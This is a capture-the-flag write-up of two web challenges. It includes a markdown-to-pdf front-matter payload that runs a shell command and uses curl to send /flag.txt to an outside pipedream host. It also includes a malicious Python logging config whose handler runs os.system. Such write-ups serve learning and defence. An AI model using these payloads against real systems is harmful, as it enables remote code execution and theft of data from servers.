## My Little website

So as far my enumeration went that's what I found: 
- `expressJS` server running
- Opens a headless chrome instance to render the pdf
- Dynamic XSS didn't work, might be beacuse the bot doesn't wait for the JS execution and even forcing it to wait doesn't really work it renders the HTML,CSS and then the PDF.

A wild guess by my teammat `M0ngi` about the markdown parser led us to the exploit ! in `markdown-to-pdf`

```md
---js
((require("child_process")).execSync("curl https://en7nqjdbzyckx.x.pipedream.net/ -d \"$(cat /flag.txt)\" "))
---
```

## Good Intentions

Reading through the code, I found that the upload is secure.
![Secure upload](./images/secure-upload.png)

Something that caught my eyes is 

![Unsecure Log set](./images/unsecure_logconf.png)

Actually I didn't know which evil configuration should I *upload* then set. Till my teammate N0s threw this link [Evil logger](https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4&h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ)


So the final sequence of requests will be : 

Upload a random file > Get it's name > Craft our evil logger to `cat` the flag in our file > Upload the logger  > Set the logger to our evil Logger ( you will receive 500 status code) > download our first uploaded file.

**Uploading an evil logger**
```py
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('cat /flag.txt > /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
```

![Flag](./images/Flag.png)



